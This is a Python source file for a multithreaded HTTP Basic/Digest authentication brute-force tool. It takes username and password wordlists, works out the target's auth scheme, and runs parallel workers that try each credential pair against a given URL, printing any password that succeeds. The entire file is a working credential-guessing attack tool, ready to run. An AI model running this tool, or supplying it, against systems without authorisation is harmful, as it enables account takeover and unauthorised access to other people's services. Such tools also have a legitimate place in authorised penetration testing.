#!/usr/bin/env python3

import os
import time
import queue
import requests
import threading

from utils import *
from typing import List, Type, Union
from urllib3.exceptions import HTTPError
from requests.auth import HTTPBasicAuth, HTTPDigestAuth


class HTTPBrute:
    _ROUND_PREC = 2
    _SUCCESS_SCODE = 200
    _LOG_STATUS_INTV = 0.5  # in seconds

    def __init__(self,
                 target_url: str,
                 user_list: List[str],
                 pass_list: List[str],
                 sleep: int,
                 workers_count: int,
                 timeout: int):
        self._log_status_lock = threading.RLock()

        # ========== reset in `_reset()`

        self._timeouts = 0
        self._total_count = 0
        self._start = float()
        self._finished = False
        self._last_status_log = float()
        self._passwords_queue = queue.Queue()

        # ==========

        self._usernames = user_list
        self._pass_list_raw = pass_list
        if len(self._usernames) == 0 or len(self._pass_list_raw) == 0:
            self._terminate(f"username list [size {len(self._usernames)}] "
                            f"and password list [size {len(self._pass_list_raw)}] "
                            f"cannot be empty!")
        else:
            print_success(f"loaded {len(self._usernames)} usernames and "
                          f"{self._passwords_queue.qsize()} passwords")

        self._url = target_url
        self._sessions = {num: requests.Session() for num in range(workers_count)}
        print_success(f"setting up sessions | url -> {self._url}")
        print_info(f"in case of too many timeouts - consider setting sleep (-s, --sleep)")

        self._workers_count = workers_count
        self._req_timeout = timeout
        self._sleep_intv = sleep
        self._auth_cls: Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]] = self._get_auth_type()

        self._results = dict()

    def _reset_run(self):
        print(DELIMITER)

        self._timeouts = 0
        self._start = float()
        self._finished = False
        self._last_status_log = float()
        self._passwords_queue = self._generate_queue(self._pass_list_raw)
        self._total_count = self._passwords_queue.qsize()

    @staticmethod
    def _generate_queue(wordlist: List[str]) -> queue.Queue[str]:
        wq = queue.Queue()
        for word in wordlist:
            wq.put(word)
        return wq

    def _get_elapsed_time(self) -> float:
        return round((time.time() - self._start) / 60, HTTPBrute._ROUND_PREC)  # minutes
    
    def _print_blank(self):
        if self._last_status_log != float():
            print("")

    def _log_status(self, left: int):
        with self._log_status_lock:
            now = time.time()
            if now - self._last_status_log > HTTPBrute._LOG_STATUS_INTV and not self._finished:
                elapsed = self._get_elapsed_time()
                passwords_checked = self._total_count - left
                time_left = left / (passwords_checked / (elapsed or 1 ** -HTTPBrute._ROUND_PREC))
                print_info(f"left -> {left} passwords "
                           f"({format_time(time_left)} mins) | "
                           f"timeouts -> {self._timeouts} | "
                           f"elapsed -> {format_time(elapsed)} mins" + ' ' * 50, reset_line=True)
                self._last_status_log = now

    def _mark_success(self, user: str, passwd: str):
        self._finished = True
        self._results[user] = passwd

    def _terminate(self, reason):
        """
        happens on error / user interrupt
        """
        with self._log_status_lock:
            self._print_blank()
            print_error(f"terminating | reason -> {reason}")
            os.kill(os.getpid(), 9)
    
    def _make_request(self, session_num: int, *args, **kwargs):
        """
        don't pass url as argument -> less overhead
        """
        return self._sessions[session_num].get(self._url, timeout=self._req_timeout, *args, **kwargs)
       
    def _get_auth_type(self) -> Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]]:
        try:
            res = self._make_request(0)
            auth_header = res.headers.get('WWW-Authenticate')
            if auth_header:
                if 'basic' in auth_header.lower():
                    return HTTPBasicAuth
                elif 'digest' in auth_header.lower():
                    return HTTPDigestAuth
                else:
                    print_error(f"auth header '{auth_header}' is not of type basic / digest!")
                    self._terminate(f"unsupported auth-type: {auth_header}")
            else:
                print_error(f"auth header is missing, please check the url")
                self._terminate(f"missing auth header ('WWW-Authenticate')")
        except Exception as exc:
            self._terminate(f"unable to determine auth-type, exception - {exc}")
            
    def _worker_routine(self, worker_num: int, username: str):
        while not self._passwords_queue.empty() and not self._finished:
            passw = self._passwords_queue.get()
            auth = self._auth_cls(username, passw)
            try:
                response = self._make_request(session_num=worker_num, auth=auth)
                if response.status_code == HTTPBrute._SUCCESS_SCODE:
                    self._mark_success(username, passw)
                self._log_status(self._passwords_queue.qsize())
            except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout,
                    requests.exceptions.ReadTimeout, HTTPError):
                self._timeouts += 1
                self._passwords_queue.put(passw)
                continue
            except requests.exceptions.TooManyRedirects:
                continue
            except Exception as exc:
                self._terminate(f"an unhandled exception occurred in one of the workers - {exc}")
            finally:
                if self._sleep_intv:  # don't call `sleep()` if interval==0 to avoid context switch overhead
                    time.sleep(self._sleep_intv)
                    
    def run(self):
        try:
            for user in self._usernames:
                self._reset_run()
                print_success(f"setting up {self._workers_count} workers | username -> {user}")
                threads = list()
                self._start = time.time()
                for worker_num in range(self._workers_count):
                    t = threading.Thread(target=self._worker_routine, args=(worker_num, user))
                    t.start()
                    threads.append(t)

                for worker in threads:
                    worker.join()
                self._print_blank()
                if user in self._results:
                    print_success(f"username {Green}{Bold}{user}{White} found password -> "
                                  f"{Green}{Bold}{self._results[user]}{White} "
                                  f"after {format_time(self._get_elapsed_time())} mins")
                else:
                    print_fail(f"username {Red}{Bold}{user}{White} failed to find password "
                               f"after {format_time(self._get_elapsed_time())} mins")
        except KeyboardInterrupt:
            self._terminate("user request")
        except Exception as exc:
            self._terminate(f"an exception occurred from main runner - {exc}")


if __name__ == "__main__":
    print_banner()
    parser = arg_parser.get_argument_parser()
    arguments = parser.parse_args()

    word_lists = dict()
    for l_args in [("user", "user_list"), ("pass", "pass_list")]:
        single_word, wordlist_path = tuple(getattr(arguments, arg) for arg in l_args)
        if not has_one([single_word, wordlist_path]):
            print_error(f"Exactly one of the following args should be used - {l_args}")
            exit(-1)
        word_lists[l_args[1]] = load_wordlist(wordlist_path) if wordlist_path else [single_word]

    HTTPBrute(target_url=arguments.target_url,
              workers_count=arguments.workers,
              timeout=arguments.timeout,
              sleep=arguments.sleep,
              **word_lists).run()
